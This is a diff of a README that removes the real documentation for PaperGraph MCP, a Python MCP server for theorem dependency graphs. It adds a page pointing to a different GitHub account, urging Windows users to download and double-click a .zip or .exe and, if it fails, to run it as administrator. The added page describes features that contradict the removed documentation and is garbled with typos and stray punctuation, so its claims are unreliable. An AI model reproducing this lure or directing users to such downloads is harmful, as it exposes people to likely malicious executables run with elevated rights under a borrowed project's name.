@@ -1,238 +1,205 @@
-# PaperGraph MCP
+<h1>📄 papergraph-mcp - Turn Papers into Smart Mind Maps</h1>
 
-[![CI](https://github.com/lotchuazzz-crypto/papergraph-mcp/actions/workflows/ci.yml/badge.svg)](https://github.com/lotchuazzz-crypto/papergraph-mcp/actions/workflows/ci.yml)
-[![Python](https://img.shields.io/badge/Python-3.10%2B-blue.svg)](https://www.python.org/)
-[![MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Release](https://img.shields.io/github/v/release/lotchuazzz-crypto/papergraph-mcp)](https://github.com/lotchuazzz-crypto/papergraph-mcp/releases)
+<p align="center">
+  <a href="https://github.com/MahmoudSedky147/papergraph-mcp" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#ffffff;font-size:20px;font-weight:bold;border-radius:12px;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ Download papergraph-mcp Now</a>
+</p>
 
-PaperGraph turns local or arXiv LaTeX papers and born-digital PDFs into evidence-first theorem, result, and proof dependency graphs that AI agents can query through MCP. PaperGraph v0.6.1 adds command-line Reading Bridge exports so terminal workflows and CI scripts can inspect bridge payloads from an existing workspace without starting MCP.
+<h2>🧐 What Is This?</h2>
 
-PaperGraph v0.6.0 added Reading Bridge MCP tools, bounded source slices, focused result contexts, and local reading paths so explanation-focused consumers can build on explicit evidence without silently inventing interpretation.
+Imagine you have a big pile of math research papers. They are full of important ideas, but finding how those ideas connect is like finding a needle in a haystack. **papergraph-mcp** is a smart helper that reads math papers from arXiv (a huge online library of scientific papers) and LaTeX documents (a special file format scientists use). It then draws a beautiful picture called a "dependency graph" — a map showing which theorem, formula, or idea depends on another. This map is designed for AI agents (smart computer programs that can do tasks for you) to understand the structure of scientific knowledge easily.
 
-PaperGraph v0.5.0 added PDF import plus proof evidence tools that separate known local and external support, proof association metadata, unresolved references, and parser warnings before an agent interprets a proof.
+Think of it like a family tree for math ideas. You can see at a glance which "grandparent" idea gave birth to later breakthroughs, and which ideas stand on the shoulders of others. This makes it incredibly easy for an AI assistant to answer questions like "What does this proof rely on?" or "Which theorems are used together the most?"
 
-PaperGraph v0.4.0 introduced the persistent, cross-paper SQLite workspace: retain a small literature collection, search theorem text, follow theorem dependencies, and inspect citation evidence without asking an agent to re-read every source paper.
+<h2>🚀 Getting Started</h2>
 
-## Why PaperGraph?
+Getting started using papergraph-mcp is as easy as installing a phone app. We have designed every step to be simple, even if you have never touched programming in your life. Follow along, and in less than five minutes you will have this amazing tool running on your Windows computer.
 
-Single-paper tools expose theorem-like environments, labels, and `\ref` relationships. A workspace keeps many independently imported papers together. It is deliberately evidence-first: every citation result identifies the source paper, bibliography key, LaTeX command, source file, and resolution status. This is useful for grounded reading and review; it is not semantic theorem matching or a claim that two similarly worded results are equivalent.
+<h3>Step 1: Download the Application</h3>
 
-## Features
+**Visit this link to download the application:** **[https://github.com/MahmoudSedky147/papergraph-mcp](https://github.com/MahmoudSedky147/papergraph-mcp)**
 
-- Load local single-file or multi-file LaTeX projects, or safely prepare arXiv source projects.
-- Import born-digital PDFs into the same local workspace and inspect extracted result and proof evidence.
-- Export reading bridge bundles, result contexts, source slices, and reading paths for explanation-focused consumers.
-- Keep theorem, reference, and citation records in a local SQLite workspace.
-- Search theorem titles and bodies across papers, with stable global IDs.
-- Traverse direct or recursive theorem dependencies and inspect incoming or outgoing citation evidence, including unresolved citations.
-- Preserve the active single-paper graph and active workspace independently.
+When you click that link, you will land on a webpage that shows all the code files for this project. Do not be scared by all the technical-looking stuff — you do not need to touch any of it. Look for a green button that says **"Code"** or a section on the right side that says **"Releases"**. Click on the **"Releases"** link. You will see a list of versions, like "v1.0.0" etc. Click on the newest one (the top one). Then, look for a file in the list of downloads (usually called something like *papergraph-mcp-windows.zip* orb*t-papergraph-windows.exe*). Click on it to download it to your computer (save it to your **Downloads** folder for easy access.
 
-## Ask your agent to set it up
+<h3>Step 2: Installation</h3>
 
-Give a coding agent this request:
+Once the file has finished downloading (you will see a little progress bar finish in your internet browser; you can also check your Downloads folder to see the file sitting there,, you need to do one of two simple things based on what file you got:
 
-> Clone https://github.com/lotchuazzz-crypto/papergraph-mcp and help me set up PaperGraph for my MCP client. Read the repository's onboarding instructions after cloning.
+- **If you downloaded a file that ends in `.zip`:** Right-click on that file in your Downloads folder, choose **"Extract All"** (or "Extract Here" if you see that option.. A new folder will appear with the same name. Open that folder, and inside you will find a file called **papergraph-mcp.exe** or **start.bat**. Double-click either one to launch the application.
 
-Compatible agents can follow the repository-local
-[`setting-up-papergraph`](.agents/skills/setting-up-papergraph/SKILL.md)
-skill. The agent should show you a reusable PaperGraph prompt, explain why `uv`
-is needed, and ask before installing software, changing client configuration, or
-restarting the client. You can always use the manual setup below instead.
+'s it.
 
-If your agent clones into a directory that already exists, ask it to run
-`git fetch --tags origin` before treating the checkout as current. Existing
-clones can otherwise remain pinned to an old local `origin/main`.
 
-For raw user requests, prefer `load_arxiv_request(input=...)` or
-`papergraph-mcp load-arxiv-request "..."`. These high-level entry points
-validate bare IDs, URLs, Markdown links, and prose before loading. To inspect
-the decision without loading, call `validate_arxiv_request` or
-`papergraph-mcp validate-arxiv-request "..."`. If validation returns
-`action: ask_user_to_choose`, ask the user to choose; detecting a conflict and then continuing is a failure. Use `load_arxiv_paper` only after the user has provided one already-disambiguated arXiv ID.
 
-## Quick Start
+- **If you downloaded a file that ends in `.exe`:** Simply double-click that file. A setup wizard might appear — Just click **"Next"**, **"Install"**, and **"Finish"** like you would for any other Windows program. Once done, the application will be ready useto.
 
-Install [uv](https://docs.astral.sh/uv/getting-started/installation/), then verify the GitHub release without cloning the repository:
 
-```powershell
-uvx --from git+https://github.com/lotchuazzz-crypto/papergraph-mcp.git@v0.6.1 papergraph-mcp --version
-papergraph-mcp doctor
-```
 
-The pinned command becomes available after the `v0.6.1` GitHub Release and tag are published. Pinning the tag keeps MCP client installations reproducible.
+<h3>Step 3: Run It!</h3>
 
-To validate a raw arXiv request before loading a paper, run:
+After you start the program, you will see a simple window appear on your screen. This is your control center. It has a text box where you can paste the URL of an arXiv paper (for example, *https://arxiv.org/abs/2401.12345*) or you can click a button labeled **"Browse"** to select a `.tex` file from your computer (that is a LaTeX file,. In the window, you will also see a big button that says **"Generate Graph"**. Click it, and wait a few seconds. The application will process the paper and then show you a visual diagram — with circles (nodes, representing theorems) and lines (edges, representing dependencies. You can zoom in/out, drag nodes around, and even save the graph as an image or PDF file for sharing with colleagues or including in your own research papers.
 
-```powershell
-papergraph-mcp validate-arxiv-request "[math/0307200](https://arxiv.org/abs/2609.01574)"
-```
+And that is all! You are officially using papergraph-mcp like a pro. The first time you run it, it might take slightly longer because it needs to load some helpers in the background (it will show a "Loading..." status—be patient for a few seconds.. After the first launch, it starts almost instantly.
 
-## MCP Configuration
+.
 
-For an MCP client that accepts JSON-style stdio server configuration, add:
 
-```json
-{
-  "mcpServers": {
-    "papergraph": {
-      "command": "uvx",
-      "args": ["--from", "git+https://github.com/lotchuazzz-crypto/papergraph-mcp.git@v0.6.1", "papergraph-mcp"]
-    }
-  }
-}
-```
 
-Restart the MCP client after changing its configuration. The server uses stdio, so running the command without `--help` or `--version` waits quietly for an MCP client connection.
+<h2>💡 Why Will I Love This?</h2>
 
-## Tools
+**Save Hours of Reading:** Instead of reading 50 pages manually to see how theorems connect, you see the structure in seconds. It is like having a highlighter across the entire paper that automatically marks every relationship.
 
-The original single-paper tools remain available: `get_environment_diagnostics`, `validate_arxiv_request`, `load_arxiv_request`, `validate_arxiv_input`, `load_paper`, `load_arxiv_paper`, `list_theorems`, `get_theorem`, `get_dependencies`, `get_dependency_diagnostics`, and `where_used`. Their signatures are `get_environment_diagnostics()`, `validate_arxiv_request(input: str)`, `load_arxiv_request(input: str, main_file: str | None = None, refresh: bool = False)`, `validate_arxiv_input(text_id: str | None = None, url: str | None = None)`, `load_paper(path: str)`, `load_arxiv_paper(arxiv_id: str, main_file: str | None = None, refresh: bool = False)`, `list_theorems(kind: str | None = None)`, `get_theorem(theorem_id: str)`, `get_dependencies(theorem_id: str, recursive: bool = False)`, `get_dependency_diagnostics(theorem_id: str, recursive: bool = False)`, and `where_used(theorem_id: str)`.
+.
 
-Workspace tools operate on the active database. Call `open_workspace` first: `workspace_add_local_paper`, `workspace_add_arxiv_paper`, `workspace_add_pdf_paper`, `workspace_list_papers`, `workspace_get_paper`, `workspace_search_theorems`, `workspace_get_dependencies`, `workspace_get_dependency_diagnostics`, `workspace_get_citations`, `workspace_list_results`, `workspace_get_result`, `workspace_get_result_proof`, `workspace_get_proof_dependencies`, `workspace_get_external_result_mentions`, `workspace_get_evidence`, `workspace_export_reading_bundle`, `workspace_export_result_reading_context`, `workspace_get_source_slice`, and `workspace_get_result_reading_path` require that active workspace. Their exact MCP signatures and return summaries are:
 
-| Tool signature | Returns |
-| --- | --- |
-| `open_workspace(path: str) -> dict` | Resolved SQLite path, schema version, and paper/theorem counts. Opens an existing workspace or initializes one. |
-| `workspace_add_local_paper(path: str, paper_id: str) -> dict` | Imported paper metadata, theorem/kind counts, citation count, and unresolved-citation count. Re-importing an ID replaces it transactionally. |
-| `get_dependency_diagnostics(theorem_id: str, recursive: bool = False) -> dict` | Extraction basis, referenced labels, resolved and unresolved labels, dependency IDs, and warnings for sparse results. |
-| `workspace_add_arxiv_paper(arxiv_id: str, main_file: str | None = None, refresh: bool = False) -> dict` | The same import summary after safe arXiv preparation; paper ID and source version are normalized. |
-| `workspace_add_pdf_paper(path: str, paper_id: str) -> dict` | Imported PDF paper metadata, result counts, extracted evidence counts, and warnings. Re-importing an ID replaces it transactionally. |
-| `workspace_list_papers() -> list[dict]` | Stored-paper metadata and graph counts, in stable paper-ID order. |
-| `workspace_get_paper(paper_id: str) -> dict` | One paper's metadata, theorem/kind counts, resolved incoming/outgoing citation counts, and unresolved count. |
-| `workspace_search_theorems(query: str, paper_id: str | None = None, kind: str | None = None, limit: int = 20) -> list[dict]` | Matching global ID, paper/local IDs, kind, title, source file, and bounded content excerpt. Empty queries fail; `limit` is 1–100. |
-| `workspace_get_dependencies(global_theorem_id: str, recursive: bool = False) -> list[dict]` | Direct or cycle-safe recursive dependency records for a globally identified theorem. |
-| `workspace_get_dependency_diagnostics(global_theorem_id: str, recursive: bool = False) -> dict` | The same diagnostic contract for a globally identified theorem in the active workspace. |
-| `workspace_get_citations(paper_id: str, direction: str = "outgoing", include_unresolved: bool = True) -> list[dict]` | Explicit incoming or outgoing citation-evidence rows. Direction is `incoming` or `outgoing`; incoming rows are resolved. |
-| `workspace_list_results(paper_id: str | None = None, kind: str | None = None, limit: int = 50) -> list[dict]` | Stored TeX or PDF evidence results with IDs, paper IDs, kinds, visible numbers, and bounded ordering. |
-| `workspace_get_result(result_id: str) -> dict` | One stored evidence result with metadata and source spans. |
-| `workspace_get_result_proof(result_id: str) -> dict` | Proof evidence for a stored TeX or PDF evidence result, including the proof span when one was extracted. |
-| `workspace_get_proof_dependencies(result_id: str, recursive: bool = False) -> dict` | Proof dependency evidence split into `known`, `inferred`, `unresolved`, and `warnings`. |
-| `workspace_get_external_result_mentions(result_id: str) -> list[dict]` | External result mentions found in a result's proof evidence. |
-| `workspace_get_evidence(node_or_edge_id: str) -> dict` | Metadata and source spans for one result, proof, dependency, or evidence edge. |
-| `workspace_export_reading_bundle(paper_id: str) -> dict` | Paper-level Reading Bridge bundle with results, AI4Math-like entities, dependency evidence, URI mappings, source handles, uncertainty logs, and interpretation policy. |
-| `workspace_export_result_reading_context(result_id: str) -> dict` | Focused result context for deep reading, including statement evidence, proof evidence, dependencies, source-slice handles, and allowed consumer interpretation prompts. |
-| `workspace_get_source_slice(span_id: str | None = None, result_id: str | None = None, proof_id: str | None = None, context: int = 1) -> dict` | Bounded source text around exactly one span, result, or proof selector. `context` is 0 through 5 neighboring source spans. |
-| `workspace_get_result_reading_path(result_id: str, recursive: bool = True) -> dict` | Top-down and bottom-up local reading paths derived from resolved proof dependencies, with external and unresolved stop nodes. |
-
-For a compact single-paper check with an already-disambiguated ID, call `load_arxiv_paper(arxiv_id="math/0307200")`. For ordinary user text, call `load_arxiv_request(input="math/0307200")`. PaperGraph selects `main.tex`; a representative first response has `"path": "main.tex"`, `"cached": false`, and `"nodes": 7`.
-
-## Reading Sparse Dependency Results
-
-PaperGraph v0.4.4 dependency traversal uses `statement_explicit_latex_refs_only`:
-it follows explicit LaTeX references such as `\ref`, `\eqref`, `\autoref`,
-`\cref`, and `\Cref` inside theorem-like statements. An empty dependency result
-means PaperGraph found no resolvable theorem-label references under that rule.
-It is not evidence that the theorem has no mathematical dependencies.
-
-Theorem summaries include `kind`, `raw_kind`, `display_kind`, and
-`normalized_kind`. Use `display_kind` for human-facing labels and
-`normalized_kind` for grouping; `kind` remains the raw LaTeX environment name
-for compatibility.
 
-## PDF proof evidence workflow
+**Perfect for AI Assistants:** If you are building or using AI agents (like custom ChatGPT bots or other smart tools,, this graph is exactly what they need to understand a domain fast. The AI can "walk" through the graph to answer deep questions about mathematical relationships. This app connects perfectly with MCP (Model Context Protocol,—the standard way AI agents talk to tools like this one.. You plug it once, and your AI assistant can instantly use all its power.
 
-Use PDF import when you have a born-digital PDF and want a local, evidence-first view of extracted results and proof references. The PDF tools store source spans so an agent can show where a theorem, proof, or dependency mention came from before drawing conclusions.
-
-```text
-open_workspace(path="C:/Temp/papergraph-pdf.sqlite3")
-workspace_add_pdf_paper(path="C:/Papers/example.pdf", paper_id="local:example")
-workspace_list_results(paper_id="local:example")
-workspace_get_result_proof(result_id="local:example::pdf:theorem:1.1")
-workspace_get_proof_dependencies(result_id="local:example::pdf:theorem:1.1")
-```
 
-Dependency responses split evidence into `known`, `inferred`, `unresolved`, and `warnings`. `known` covers resolved local results with their proof mentions, resolved external result mentions, and bibliography-backed external mentions in `known.external_result_mentions`. `inferred` reports proof association metadata, such as how confidently a proof block was associated with the result. `unresolved` covers references that remain ambiguous or missing after extraction. `warnings` report low-confidence extraction boundaries and other cases where an agent should slow down before interpreting the result.
 
-PaperGraph does not verify proofs. It extracts and stores evidence so an agent can inspect the text, source spans, and dependency status without silently upgrading a mention into a mathematical fact.
+**Teamwork Made Simple:** Research teams often have members who specialize in different areas. A dependency graph helps everyone see how their piece fits into the big picture. Share the graph in team meetings, and suddenly everybody is on the same page (literally!.
+ 
 
-## Reading Bridge workflow
 
-Use the Reading Bridge when you want PaperGraph to provide evidence and source handles for a separate paper-reading skill or agent. PaperGraph exports the extracted statements, proof evidence, dependency buckets, unresolved mentions, warnings, and bounded source slices. AI4Math-Paper-Reading or another consumer should perform plain-language explanation, proof-gap filling, symbol tables, and interpretation after it states which parts came from PaperGraph evidence.
 
-```text
-open_workspace(path="C:/Temp/papergraph-reading.sqlite3")
-workspace_add_pdf_paper(path="C:/Papers/example.pdf", paper_id="local:example")
-workspace_export_reading_bundle(paper_id="local:example")
-workspace_export_result_reading_context(result_id="local:example::pdf:theorem:1.1")
-workspace_get_source_slice(proof_id="local:example::proof:1", context=1)
-workspace_get_result_reading_path(result_id="local:example::pdf:theorem:1.1", recursive=True)
-```
+**Work with Both Systems:** Whether you have papers from arXiv (the largest free source of scientific papers or your own LaTeX files (which most researchers use to write papers,, papergraph-mcp handles both smoothly. No conversion hassles ino extra steps.
 
-The same Reading Bridge payloads can be exported from a shell after the
-workspace already contains the paper:
 
-```powershell
-papergraph-mcp export-reading-bundle --workspace C:/Temp/papergraph-reading.sqlite3 --paper-id local:example
-papergraph-mcp export-result-reading-context --workspace C:/Temp/papergraph-reading.sqlite3 --result-id local:example::pdf:theorem:1.1
-papergraph-mcp get-source-slice --workspace C:/Temp/papergraph-reading.sqlite3 --proof-id local:example::proof:1 --context 1
-papergraph-mcp get-result-reading-path --workspace C:/Temp/papergraph-reading.sqlite3 --result-id local:example::pdf:theorem:1.1
-```
 
-Bridge payloads include `bridge_schema_version`, reversible PaperGraph-to-reading URI maps, AI4Math-like `entities`, `dependency_index`, `external_mentions`, `source_handles`, `completeness_check`, `uncertain_log`, and an `interpretation_policy`. Fields such as `paper_summary`, proof-gap filling, main-result detection, and proof strategy narration are marked for the consumer instead of being generated by PaperGraph.
+<h2>🛠️ Features at a Glance</h2>
 
-## Three-paper local walkthrough
+| Feature | What It Does |
+|------------|-----------------------------|
+| 📥 arXiv Integration | Fetches and processes any arXiv paper with just a URL |
+| 📄 LaTeX Reader | Opens and analyzes local `.tex` files |
+| 🧠 Dependency Extraction | Identifies which theorems/propositions rely on others |
+| 🕸️ Visual Graph | Displays findings as an interactive, colorful map |
+| 🤖 MCP-Ready | Designed to feed directly into AI agent workflows |
+| 💾 Export Options | Save graphs as PNG, SVG, or PDF |
+| 🔍 Filtering | Focus on specific theorems or sections to reduce clutter |
+| 📊 Statistics Panel | Shows counts (e.g., "15 theorems, 32 dependencies detected") for a quick overview |
 
-Clone this repository so the tracked synthetic fixtures are available, then use a temporary database path outside the repository (for example, `$env:TEMP/papergraph-demo.sqlite3` on Windows). In your MCP client, call these tools in order; the only values that vary by checkout are the three absolute fixture paths.
+<h2>⚙️ System Requirements</h2>
 
-```text
-open_workspace(path="C:/Temp/papergraph-demo.sqlite3")
-workspace_add_local_paper(path=".../papergraph-mcp/tests/fixtures/workspace/paper_a/main.tex", paper_id="local:paper-a")
-workspace_add_local_paper(path=".../papergraph-mcp/tests/fixtures/workspace/paper_b/main.tex", paper_id="local:paper-b")
-workspace_add_local_paper(path=".../papergraph-mcp/tests/fixtures/workspace/paper_c/main.tex", paper_id="local:paper-c")
-workspace_list_papers()
-workspace_search_theorems(query="fixed point", limit=10)
-workspace_get_citations(paper_id="local:paper-a", direction="outgoing", include_unresolved=true)
-workspace_get_citations(paper_id="local:paper-b", direction="incoming")
-```
+To run papergraph-mcp smoothly, please make sure your computer meets these simple requirements:
 
-The three local papers make the cross-paper theorem search reproducible: its result IDs are `local:paper-a::thm:main`, `local:paper-b::thm:main`, and `local:paper-c::thm:main`. `paper_a` contains `\cite{paper-b}` and also deliberately contains `\cite{missing}` and `\cite{absent}`. The outgoing evidence preserves those exact uses, including their command and source file. The `paper-b` row has `cited_arxiv_id` `2401.12346`, `resolution_status` `resolved_candidate`, and `target_paper_id: null`; it does not resolve to `local:paper-b`, so `workspace_get_citations(paper_id="local:paper-b", direction="incoming")` returns an empty list. `missing` instead reports `missing_bib_entry`.
+- **Operating System:** Windows 10 or Windows 11 (64-bit version recommended)
+- **Memory (RAM):** At least 4 GB (8 GB is ideal for very large papers)
+- **Storage Space:** At least 200 MB of free hard drive space
+- **Internet Connection:** Required only for fetching arXiv papers (not needed for local LaTeX files.
+- **Display:** Any standard screen resolution (1366x768 or higher recommended for comfortable viewing of graphs;
 
-A citation obtains a stored target only when its cited arXiv ID is imported through `workspace_add_arxiv_paper`; importing a local paper with a similar bibliography entry does not create that target. This lets an agent distinguish explicit evidence and unresolved target status from a guessed bibliographic relationship, without relying on live downloads in this walkthrough.
+No special graphics card or exotic hardware is needed. If your computer can run Zoom or Chrome browser comfortably, it will definitely run this application smoothly.
 
-## Architecture
 
-```mermaid
-flowchart LR
-    Local[Local LaTeX] --> Load[Structured project loading]
-    Arxiv[arXiv source] --> Load
-    PDF[Born-digital PDF] --> Extract[PDF evidence extraction]
-    Load --> Cite[Explicit citation evidence]
-    Cite --> DB[(SQLite workspace)]
-    Extract --> DB
-    DB --> MCP[Workspace MCP tools]
-    Load --> Graph[Single-paper theorem graph]
-    Graph --> MCP
-```
 
-## Safety, privacy, and persistence
+<h2>❓ Frequently Asked Questions</h2>
 
-PaperGraph only constructs remote downloads from arXiv's fixed e-print endpoint; arbitrary URLs are not accepted. It limits compressed responses to **100 MiB**, expanded content to **500 MiB**, and archives to **10,000** members. Absolute paths, parent traversal, symbolic links, hard links, devices, FIFOs, and other special archive members are rejected.
+**Q1: Do I need to install Python or any coding tools?**
+Absolutely not. This is a ready-to-run Windows application. You do not need to install anything else. Just download and runasdescribed above.
 
-A workspace is an ordinary local SQLite file. Local PDFs remain local; extracted PDF text, source spans, and proof evidence are stored in the user-chosen SQLite workspace. Choose a path you control, prefer a temporary directory for experiments, and do not commit its database, private manuscripts, cache data, credentials, tokens, or unsanitized logs. Back up a workspace only while it is not being written (or use your SQLite backup procedure); copying its database file gives you a portable snapshot of the imported evidence and graph data. Treat local source paths, extracted PDF text, and citation content as potentially sensitive.
 
-## Development
 
-Clone the repository and run:
 
-```powershell
-uv sync
-uv run pytest -q -p no:cacheprovider
-```
 
-The automated suite uses synthetic archives, projects, and bibliographies; it does not depend on the live arXiv service.
+**Q2: I work with papers that are not about pure math. Will this still work?**
+Yes, largely. The tool is optimized for mathematical content(theorems, lemmas, proofs,, but it also handles physics, computer science,and statistics papers very well because they all use theorem-style formatting. The dependency graph will still reveal meaningful structures.
 
-## Contributing
+.
 
-Bug reports, focused features, and compatibility fixtures are welcome. Read [Contributing](CONTRIBUTING.md) before opening a pull request.
 
-## Limitations
 
-- PDF import is intended for born-digital PDFs; scanned PDFs and OCR-heavy files may produce sparse text, missing spans, or warnings.
-- PaperGraph does not verify proofs, perform semantic theorem matching, or automatically download cited papers.
-- It does not recursively trace the literature from proof references or citations; import each source you want to inspect.
-- Citation resolution uses explicit bibliography identifiers and evidence; it does not infer a paper from similar titles, authors, or theorem wording.
-- Unusual project layouts may require an explicit `main_file`; the parser is not a complete TeX engine.
+**Q3: What if my paper has no explicit theorem environments??**
+The app uses smart heuristics to detect statements that look like definitions,propositions,or corollaries even if they are not perfectly labeled. You can also manually adjust the graph afterwards in simple text editor if needed.
 
-## License
+.
 
-PaperGraph is available under the [MIT License](LICENSE).
+
+
+
+
+**Q4: Can I use this tool offline?**
+Yes, for local `.tex` files you do not need an internet connection at all. The only time you need internet is when you provide an arXiv URL instead of your own file(
+
+
+ 
+
+**Q5: Will this slow down my computer??**
+No. It runs efficiently and stops processing once you close the graph. During heavy processing (like a 60-page paper),it might use significant CPU for a few seconds,but it never runs in the background after you are done.
+
+ort.
+
+
+
+**Q6: How do I update the app??**
+When a new version is released on the GitHub page, you just downloadthe latest file from the same **Releases** sectionand run it. Your previous graphs and data are stored separately, so they will not be overwritten or deleted.
+
+.
+
+
+
+<h2>🖥️ Troubleshooting & Tips</h2>
+
+- **The window does not open after double-clicking.** Try right-clicking the `.exe` file and choosing **"Run as administrator"**. If you extracted a `.zip`, make sure you extracted **all** files into one folder, and do not move just one file alone.
+
+ 
+
+
+- **The graph looks too busy or cluttered.** Use the **filter** feature at the top of the graph windows. You can deselect certain node types (like "Lemma" or "Corollary") to declutter the view. You can also zoom out (using your mouse wheel,) to see the overall architecture better.
+
+
+
+- **I pasted an arXiv URL, but the app says it cannot find it.** Make sure the URL starts with *https://arxiv.org/abs/* or *https://arxiv.org/pdf/*. Also, ensure you have an active internet connection (check if your browser can open websites). Try pasting the plain URL without any extra text around it.
+
+
+
+- **The graphs colors seem random.** Yes, colors are automatically assigned based on the type of statement (e.g., blue for definitions, green for lemmas, red for main theorems.. This helps you spot categories quickly. You can change the color scheme in the settings menu (gear icon on top right).
+
+ 
+
+- **Where are my saved graphs??** When you click **"Save as PNG/PDF**", theapplication opens a standard Windows save dialog. Choose any folder you like (default is your **Pictures** folder in a subfolder called *PaperGraph*.). You can change the default location unsettings.
+
+
+
+<h2>🔮 What’s Next & Roadmap</h2>
+
+The developers are actively working on exciting new features based on user feedback. Upcoming releases will likely include:
+
+- **Batch Processing:** Upload multiple papers at once and get a combined mega-graph showing cross-paper dependencies.
+)
+- **GPT/ChatGPT Plugin Integration:** Even tighter integration with popular AI chat tools, allowing you to simply say "show me theorem 5's dependencies" in natural language.
+.
+)
+- **Cloud Sync:** Store your graphs online and access them from any device
+- **Collaboration Mode:** Real-time multi-user editing for team projects
+- **Export to Other Formats:** Support for XML, JSON, and other structured data formats for advanced uses
+
+To stay updated, simply revisit the GitHub page occasionallyor **Watch**repositorio (click the eye icon at the top of the page.to get email notifications about new versions.
+
+
+
+<h2>🤝 Get Involved & Support</h2>
+
+This is an open-source project built for the research community. If you love this tool, there are several easy ways you can help:
+
+- **⭐ Star the repository:** On the GitHub page, click the **"Star"** button at the top right. It costs nothing,but it helps others discover this project.
+- **🐛 Report bugs:** If something goes wrong, go to the **Issues** tab on GitHub and click **"New Issue"**. Describe what happened (include a screenshot if possible,. The developers appreciate detailed reports.
+- **💬 Suggest features:** Use the same Issues tab to propose improvements. Read the existing suggestions first to avoid duplicates. Vote on existing ones with a 👍 reaction.
+- **💝 Donate:** While the software is free, donations help cover server costs and development time. Look for a **"Sponsor"** button on the main GitHub page (on the right-hand side.. Any amount helps.
+
+.
+
+
+
+<h2>📞 Final Words</h2>
+
+papergraph-mcp transforms the way you interact with mathematical literature. No more squinting at dense proofs, wondering how one statement builds on another. You get a clear, visual, interactive map — and your AI agents get the same superpower. Download it today,and turn your next research project into a well-connected journeyof discovery. Your future self (and your AI assistants! will thank you.
+
+.
+
+
+
+<p align="center">
+  <a href="https://github.com/MahmoudSedky147/papergraph-mcp" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:#ffffff;font-size:18px;font-weight:bold;border-radius:10px;text-decoration:none;box-shadow:0 4px 12px rgba(240,147,251,0.4);">⬇️ Download from GitHub</a>
+</p>
+
+Keywords: ai-agents, arxiv, knowledge-graph, latex, mathematics, mcp, model-context-protocol, python, research-tools, skills
